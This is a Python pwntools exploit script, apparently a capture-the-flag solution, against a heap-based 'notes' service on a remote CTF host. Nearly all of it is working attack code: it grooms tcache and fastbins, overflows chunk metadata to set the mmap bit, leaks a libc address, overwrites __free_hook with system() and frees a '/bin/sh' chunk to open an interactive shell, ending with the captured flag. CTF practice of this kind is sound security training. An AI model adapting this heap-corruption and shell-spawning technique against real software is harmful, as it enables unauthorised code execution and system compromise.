from pwn import *


# ---------- FUNCTIONS ----------
def create():
    p.recv()
    p.sendline('1')
    p.recvline();
    p.recvline();
    p.recvline();
    p.recvline()


def write(index, title_length, content_length, title, content):
    p.recv()
    p.sendline('2')
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(str(title_length))
    p.recv()
    p.sendline(str(content_length))
    p.recv()
    p.sendline(title)
    p.recv()
    p.sendline(content)
    p.recvline()


def edit(index, title=None, content=None):
    p.recv()
    p.sendline('3')
    p.recv()
    p.sendline(str(index))
    p.recv()
    if title:
        p.sendline(title)
        p.recvline()
    if content:
        p.sendline(content)
        p.recvline()


def read(index):
    p.recv()
    p.sendline('4')
    p.recv()
    p.sendline(str(index))
    title, content = p.recvline(), p.recvline()
    p.recvline()
    return title, content


def delete(index):
    # p.recv()
    p.sendline('5')
    p.recv()
    p.sendline(str(index))
    p.recvline()


# ---------- MAIN EXPLOIT ---------

LEAK_OFFSET = 0x1ebce0
__FREE_HOOK_OFFSET = 0x1eeb28
SYSTEM_OFFSET = 0x55410

p = remote('ctf.cscml.zenysec.com', 20006)
# p = process('./notes')
# gdb.attach(p)


# fill tcache size 250
for i in range(7):
    create()
    write(0, 16, 250, b'X' * 10, b'Z' * 240)
    delete(0)
# fill tcache size 350
for i in range(7):
    create()
    write(0, 16, 350, b'X' * 10, b'Z' * 240)
    delete(0)

# clean fastbin
create()
write(0, 16, 350, b'X' * 10, b'Z' * 240)

# prepare reserve notes
create()  # 1
create()  # 2
create()  # 3
create()  # 4

# prepare heap layout to overflow metadata of the next chunk
write(1, 16, 350, b'A' * 10, b'B' * 240)
write(2, 16, 250, b'C' * 10, b'D' * 240)
delete(2)
delete(1)

# 1.    send chunks from unsorted-bin to small-bin
# 2.    overflow into next chunk and set the mmap bit
write(3, 16, 1000, b'X' * 24 + p16(0x113), b'A' * 100)

# allocate the chunk with the mmap bit (leads to uninitialized memory chunk)
# that that contains libc addresses.
write(4, 250, 16, '', '')

t, c = read(4)
leak = t[8:16]
leak = struct.unpack("<Q", leak)[0]
log.info("leak address --> %s" % hex(leak))
libc_base = leak - LEAK_OFFSET
log.info("libc base --> %s" % hex(libc_base))

# clean tcache
create()  # 1
write(1, 40, 350, b'A' * 10, b'B' * 240)

# prepare reserve notes
create()  # 2
create()  # 5
create()  # 6
create()  # 7
create()  # 8
create()  # 9

# prepare heap layout
write(2, 40, 16, b'V' * 15, b'L' * 15)
# prepare fast bin - remove non-relevant chunk
create()
#
delete(2)
# prepare fast bin - remove non-relevant chunk
create()
# prepare fake note structure with pointer to overwrite
target = p64(libc_base + __FREE_HOOK_OFFSET)
length = p64(0x11223344)
write(5, 40, 100, b'A' * 16 + target + length, b'0' * 40)
# send prepared chunks to fastbin
delete(5)
# prepare fast bin - remove non-relevant chunk
create()
# overflow into next chunk and set the mmap bit
write(6, 16, 100, b'X' * 24 + p8(0x33), b'A' * 8)
# prepare fast bin - remove non-relevant chunk
create()  # 11

# write-what-where: write system address into __free_hook pointer
edit(11, None, p64(libc_base + SYSTEM_OFFSET))

# create new note with atguments to system
create()  # 12
write(12, 100, 100, b"/bin/sh", b"/bin/sh")
# trigger system("/bin/sh") by calling free() function
delete(12)

p.recv()
p.interactive()

# FLAG --> CSCML2020{I_have_not_failed_Ive_just_found_10000_ways_that_wont_work}
